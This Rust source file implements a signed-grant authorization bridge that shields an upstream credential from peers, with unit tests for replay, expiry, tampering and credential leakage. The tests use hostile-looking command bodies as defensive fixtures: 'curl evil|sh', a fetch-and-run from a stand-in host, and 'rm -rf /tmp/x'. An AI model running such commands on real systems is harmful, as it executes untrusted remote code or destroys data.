//! R1-B, the grant check: the node is the only holder of the upstream (AXXIS kernel) credential. A peer
//! never sees it. It presents a DOT device grant (Grant v1) for one resource, `observe` or `control`,
//! valid until `expires` on the node's own clock, and signs each request with the grant's subject key.
//!
//! - No grant, a grant that does not verify (expired, revoked, another epoch, another audience, a bad
//!   signature) or a request for more than the grant gives (observe asking for control) reaches nothing.
//! - A control use is reserved in the K4 journal, and the reservation anchored, before any byte goes
//!   upstream. If the journal or its anchor will not move, nothing is sent.
//! - Observe is checked the same way but not journaled: a view reads many times a second, and reading
//!   changes nothing upstream.
//! - What the upstream says when it fails is never passed on, so a credential echoed in an upstream error
//!   cannot reach a peer. Refusals carry no detail beyond their kind.
use dot_terminal_authority::{Grant, Journal, Outcome, Policy, Request};

/// What an operation needs from its grant. The node decides this from the operation, never the peer.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Need {
    Observe,
    Control,
}
impl Need {
    pub fn action(self) -> &'static str {
        match self {
            Need::Observe => "observe",
            Need::Control => "control",
        }
    }
}

/// A grant as a peer presents it: the owner-signed grant and one subject-signed request.
pub struct Presented {
    pub grant: Grant,
    pub owner_signature: Vec<u8>,
    pub request: Request,
    pub subject_signature: Vec<u8>,
}

/// The upstream the node bridges to. It holds the credential. Its error text may carry anything,
/// including that credential echoed back, so the bridge drops it: it never reaches a peer.
pub trait Upstream {
    fn call(&mut self, resource: &str, body: &[u8]) -> Result<Vec<u8>, String>;
}

/// Why a peer got nothing. The kind only; the reason stays on the node.
#[derive(Debug, PartialEq, Eq)]
pub enum Refused {
    /// No grant was presented.
    NoGrant,
    /// The grant does not allow this, or no longer does.
    Denied,
    /// This request was already used, or the grant has no uses left.
    Spent,
    /// The journal or its anchor would not move; nothing was sent.
    Unavailable,
    /// The upstream failed; its answer is not passed on.
    Upstream,
}
impl std::fmt::Display for Refused {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(match self {
            Refused::NoGrant => "no grant",
            Refused::Denied => "not granted",
            Refused::Spent => "already used",
            Refused::Unavailable => "authority unavailable",
            Refused::Upstream => "upstream failed",
        })
    }
}

/// Trusted node configuration: never from a peer.
pub struct Trust {
    pub owner_key: [u8; 32],
    pub audience: String,
    pub policy_epoch: u64,
    pub revoked: Vec<[u8; 32]>,
    /// Seconds since the epoch, from the node's clock.
    pub clock: Box<dyn Fn() -> u64 + Send>,
}
impl Trust {
    pub fn system_clock() -> Box<dyn Fn() -> u64 + Send> {
        Box::new(|| {
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0)
        })
    }
}

pub struct Bridge<U: Upstream> {
    trust: Trust,
    journal: Journal,
    upstream: U,
}
impl<U: Upstream> Bridge<U> {
    pub fn new(trust: Trust, journal: Journal, upstream: U) -> Self {
        Self {
            trust,
            journal,
            upstream,
        }
    }

    /// One operation for a peer. `need` comes from the operation the node is about to forward.
    pub fn call(
        &mut self,
        presented: Option<&Presented>,
        need: Need,
        body: &[u8],
    ) -> Result<Vec<u8>, Refused> {
        let p = presented.ok_or(Refused::NoGrant)?;
        // The request must ask for exactly what this operation needs; verify then binds it to the grant.
        if p.request.action != need.action() {
            return Err(Refused::Denied);
        }
        let policy = Policy {
            owner_key: &self.trust.owner_key,
            audience: &self.trust.audience,
            epoch: self.trust.policy_epoch,
            now: (self.trust.clock)(),
            revoked: &self.trust.revoked,
        };
        let resource = p.request.resource.clone();
        match need {
            Need::Observe => {
                dot_terminal_authority::verify(
                    &p.grant,
                    &p.owner_signature,
                    &p.request,
                    &p.subject_signature,
                    body,
                    &policy,
                )
                .map_err(refusal)?;
                self.upstream
                    .call(&resource, body)
                    .map_err(|_| Refused::Upstream)
            }
            Need::Control => {
                let permit = self
                    .journal
                    .authorize(
                        &p.grant,
                        &p.owner_signature,
                        &p.request,
                        &p.subject_signature,
                        body,
                        &policy,
                    )
                    .map_err(refusal)?;
                // Reserved and anchored: only now may a byte go upstream.
                let result = self.upstream.call(&resource, body);
                // The use stays spent whatever happens next; an outcome the journal cannot record
                // leaves it pending, which still counts against the grant.
                let _ = self.journal.finish(
                    permit,
                    if result.is_ok() {
                        Outcome::Succeeded
                    } else {
                        Outcome::Unknown
                    },
                );
                result.map_err(|_| Refused::Upstream)
            }
        }
    }
}

fn refusal(error: dot_terminal_authority::Error) -> Refused {
    use dot_terminal_authority::Error as E;
    match error {
        E::Denied => Refused::Denied,
        E::Spent => Refused::Spent,
        E::NotPending
        | E::Journal(_)
        | E::AnchorUnavailable(_)
        | E::Tampered(_)
        | E::Encoding(_) => Refused::Unavailable,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use dot_terminal_authority::{MemoryAnchor, Tip, TipAnchor, grant_message, request_message};
    use ring::digest;
    use ring::signature::{Ed25519KeyPair, KeyPair};
    use std::sync::{Arc, Mutex};

    const TOKEN: &str = "axxis-kernel-token-DO-NOT-LEAK-7f3a";

    /// (resource, body, anchor advances seen at the moment of the call)
    type Call = (String, Vec<u8>, u32);
    /// A stand-in upstream: it holds the credential, counts calls, and on each call records whether a
    /// reservation was already anchored. It can be told to fail with the credential in its error text.
    #[derive(Clone)]
    struct Kernel {
        calls: Arc<Mutex<Vec<Call>>>,
        advances: Arc<Mutex<u32>>,
        fail: bool,
    }
    impl Upstream for Kernel {
        fn call(&mut self, resource: &str, body: &[u8]) -> Result<Vec<u8>, String> {
            let anchored = *self.advances.lock().unwrap();
            self.calls
                .lock()
                .unwrap()
                .push((resource.into(), body.to_vec(), anchored));
            if self.fail {
                // A real upstream can echo its Authorization header in an error page.
                return Err(format!("401 Unauthorized: Bearer {TOKEN}"));
            }
            Ok(format!("ok:{resource}").into_bytes())
        }
    }
    /// An anchor that counts advances and can be made to refuse them.
    #[derive(Clone)]
    struct Counted {
        inner: MemoryAnchor,
        advances: Arc<Mutex<u32>>,
        refuse: Arc<Mutex<bool>>,
    }
    impl TipAnchor for Counted {
        fn tip(&self) -> Result<Option<Tip>, dot_terminal_authority::Error> {
            self.inner.tip()
        }
        fn advance(&mut self, tip: Tip) -> Result<(), dot_terminal_authority::Error> {
            if *self.refuse.lock().unwrap() {
                return Err(dot_terminal_authority::Error::AnchorUnavailable(
                    "down".into(),
                ));
            }
            self.inner.advance(tip)?;
            *self.advances.lock().unwrap() += 1;
            Ok(())
        }
    }

    struct World {
        _dir: tempfile::TempDir,
        owner: Ed25519KeyPair,
        device: Ed25519KeyPair,
        bridge: Bridge<Kernel>,
        kernel: Kernel,
        refuse: Arc<Mutex<bool>>,
        now: Arc<Mutex<u64>>,
    }
    fn world(fail: bool) -> World {
        let dir = tempfile::tempdir().unwrap();
        let owner = Ed25519KeyPair::from_seed_unchecked(&[1; 32]).unwrap();
        let device = Ed25519KeyPair::from_seed_unchecked(&[2; 32]).unwrap();
        let advances = Arc::new(Mutex::new(0));
        let refuse = Arc::new(Mutex::new(false));
        let anchor = Counted {
            inner: MemoryAnchor::default(),
            advances: advances.clone(),
            refuse: refuse.clone(),
        };
        let journal = Journal::open(
            &dir.path().join("journal"),
            Ed25519KeyPair::from_seed_unchecked(&[9; 32]).unwrap(),
            Box::new(anchor),
        )
        .unwrap();
        let now = Arc::new(Mutex::new(1_000));
        let clock = now.clone();
        let trust = Trust {
            owner_key: owner.public_key().as_ref().try_into().unwrap(),
            audience: "dot-node-core".into(),
            policy_epoch: 1,
            revoked: vec![],
            clock: Box::new(move || *clock.lock().unwrap()),
        };
        let kernel = Kernel {
            calls: Default::default(),
            advances,
            fail,
        };
        World {
            _dir: dir,
            owner,
            device,
            bridge: Bridge::new(trust, journal, kernel.clone()),
            kernel,
            refuse,
            now,
        }
    }
    impl World {
        /// A grant for `action` on session s1, valid for [900, 2000), and one request under it.
        fn present(
            &self,
            grant_action: &str,
            request_action: &str,
            nonce: u8,
            body: &[u8],
        ) -> Presented {
            let grant = Grant {
                version: 1,
                id: [3; 32],
                subject: self.device.public_key().as_ref().try_into().unwrap(),
                run: [4; 32],
                audience: "dot-node-core".into(),
                resource: "axxis:session:s1".into(),
                action: grant_action.into(),
                not_before: 900,
                expires: 2_000,
                policy_epoch: 1,
                max_uses: 5,
            };
            let request = Request {
                version: 1,
                grant_id: grant.id,
                run: grant.run,
                nonce: [nonce; 32],
                audience: grant.audience.clone(),
                resource: grant.resource.clone(),
                action: request_action.into(),
                body_sha256: digest::digest(&digest::SHA256, body)
                    .as_ref()
                    .try_into()
                    .unwrap(),
            };
            Presented {
                owner_signature: self
                    .owner
                    .sign(&grant_message(&grant).unwrap())
                    .as_ref()
                    .to_vec(),
                subject_signature: self
                    .device
                    .sign(&request_message(&request).unwrap())
                    .as_ref()
                    .to_vec(),
                grant,
                request,
            }
        }
        fn calls(&self) -> Vec<Call> {
            self.kernel.calls.lock().unwrap().clone()
        }
    }

    #[test]
    fn no_grant_an_expired_grant_or_observe_asking_for_control_reaches_nothing() {
        let mut w = world(false);
        assert_eq!(
            w.bridge.call(None, Need::Observe, b"read"),
            Err(Refused::NoGrant)
        );

        let observe = w.present("observe", "observe", 1, b"read");
        *w.now.lock().unwrap() = 2_000; // the node's clock says expired; the peer has no say
        assert_eq!(
            w.bridge.call(Some(&observe), Need::Observe, b"read"),
            Err(Refused::Denied)
        );
        *w.now.lock().unwrap() = 1_000;

        // Observe asking for control: as a request for control under an observe grant, and as an
        // observe request pointed at a control operation.
        let asks_control = w.present("observe", "control", 2, b"keys");
        assert_eq!(
            w.bridge.call(Some(&asks_control), Need::Control, b"keys"),
            Err(Refused::Denied)
        );
        let observe = w.present("observe", "observe", 3, b"keys");
        assert_eq!(
            w.bridge.call(Some(&observe), Need::Control, b"keys"),
            Err(Refused::Denied)
        );

        assert!(w.calls().is_empty(), "nothing reached the upstream");
    }

    #[test]
    fn a_valid_observe_grant_reads_without_writing_the_journal() {
        let mut w = world(false);
        let observe = w.present("observe", "observe", 1, b"read");
        assert_eq!(
            w.bridge
                .call(Some(&observe), Need::Observe, b"read")
                .unwrap(),
            b"ok:axxis:session:s1"
        );
        assert_eq!(w.calls().len(), 1);
        assert_eq!(
            *w.kernel.advances.lock().unwrap(),
            0,
            "observe is not journaled"
        );
    }

    #[test]
    fn a_control_use_is_reserved_and_anchored_before_any_byte_goes_upstream() {
        let mut w = world(false);
        let control = w.present("control", "control", 1, b"ls\r");
        w.bridge
            .call(Some(&control), Need::Control, b"ls\r")
            .unwrap();
        let calls = w.calls();
        assert_eq!(calls.len(), 1);
        assert_eq!(calls[0].1, b"ls\r");
        assert!(
            calls[0].2 >= 1,
            "the reserve was anchored before the upstream saw a byte"
        );
        // The same request again is a replay: spent, and the upstream is not called twice.
        assert_eq!(
            w.bridge.call(Some(&control), Need::Control, b"ls\r"),
            Err(Refused::Spent)
        );
        assert_eq!(w.calls().len(), 1);
    }

    #[test]
    fn if_the_anchor_will_not_move_no_control_byte_is_sent() {
        let mut w = world(false);
        *w.refuse.lock().unwrap() = true;
        let control = w.present("control", "control", 1, b"rm -rf /tmp/x\r");
        assert_eq!(
            w.bridge
                .call(Some(&control), Need::Control, b"rm -rf /tmp/x\r"),
            Err(Refused::Unavailable)
        );
        assert!(w.calls().is_empty());
    }

    #[test]
    fn a_body_other_than_the_signed_one_is_refused() {
        let mut w = world(false);
        let control = w.present("control", "control", 1, b"echo hi\r");
        assert_eq!(
            w.bridge
                .call(Some(&control), Need::Control, b"curl evil|sh\r"),
            Err(Refused::Denied)
        );
        assert!(w.calls().is_empty());
    }

    #[test]
    fn the_upstream_credential_is_in_no_response_refusal_or_error() {
        for fail in [false, true] {
            let mut w = world(fail);
            let mut seen = vec![];
            for (grant, need, nonce) in
                [("observe", Need::Observe, 1), ("control", Need::Control, 2)]
            {
                let p = w.present(grant, need.action(), nonce, b"x");
                let out = w.bridge.call(Some(&p), need, b"x");
                // Read what a peer would read: the response bytes as text, and the refusal as shown.
                match &out {
                    Ok(bytes) => seen.push(String::from_utf8_lossy(bytes).into_owned()),
                    Err(e) => seen.push(format!("{e:?}")),
                }
                if let Err(e) = &out {
                    seen.push(e.to_string());
                }
            }
            seen.push(format!("{:?}", w.bridge.call(None, Need::Control, b"x")));
            for text in seen {
                // The failure names where, never prints what: test output is output too.
                assert!(
                    !text.contains(TOKEN),
                    "the upstream credential reached a peer ({} bytes of output)",
                    text.len()
                );
            }
        }
    }
}
